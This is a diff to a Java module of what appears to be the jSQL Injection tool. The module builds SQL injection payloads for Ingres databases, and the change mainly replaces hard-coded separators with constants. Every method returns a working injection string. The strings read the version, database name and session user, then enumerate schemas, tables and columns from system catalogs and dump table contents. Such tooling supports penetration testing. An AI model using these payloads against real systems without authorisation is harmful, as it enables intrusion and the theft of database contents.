@@ -1,5 +1,8 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -8,18 +11,18 @@ import com.jsql.model.bean.database.Database;
 import com.jsql.model.bean.database.Table;
 import com.jsql.util.StringUtil;
 
-public class IngresVendor extends AbstractVendor {
+public class IngresVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
-            "SELECT+dbmsinfo('_version')||'%04'||dbmsinfo('database')||'%04'||dbmsinfo('session_user')||0x01030307+r";
+            "SELECT+dbmsinfo('_version')||'"+ SEPARATOR_SQL +"'||dbmsinfo('database')||'"+ SEPARATOR_SQL +"'||dbmsinfo('session_user')||0x01030307+r";
     }
 
     @Override
     public String getSqlDatabases() {
         return
-            "select+rr||0x01030307+r+from(select+0x04||trim(t.schema_name)||'%050%04'rr+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.schema_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
             "where+t.schema_name>=t1.schema_name+" +
             "group+by+1{limit})a";
@@ -28,7 +31,7 @@ public class IngresVendor extends AbstractVendor {
     @Override
     public String getSqlTables(Database database) {
         return
-            "select+rr||0x01030307+r+from(select+0x04||trim(t.table_name)||'%050%04'rr+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.table_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
             "where+t.table_name>=t1.table_name+" +
             "group+by+1{limit})a";
@@ -37,7 +40,7 @@ public class IngresVendor extends AbstractVendor {
     @Override
     public String getSqlColumns(Table table) {
         return
-            "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'%050%04'rr+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
             "where+t.column_name>=t1.column_name+" +
             "group+by+1{limit})a";
@@ -51,7 +54,7 @@ public class IngresVendor extends AbstractVendor {
         formatListColumn = "trim(ifnull(varchar(" + formatListColumn + "),''))";
 
         return
-            "select+rr||0x01030307+r+from(select+0x04||trim(t.s)||'%050%04'rr+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.s)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
             "where+t.s>=t1.s+" +
             "group+by+1{limit})a";
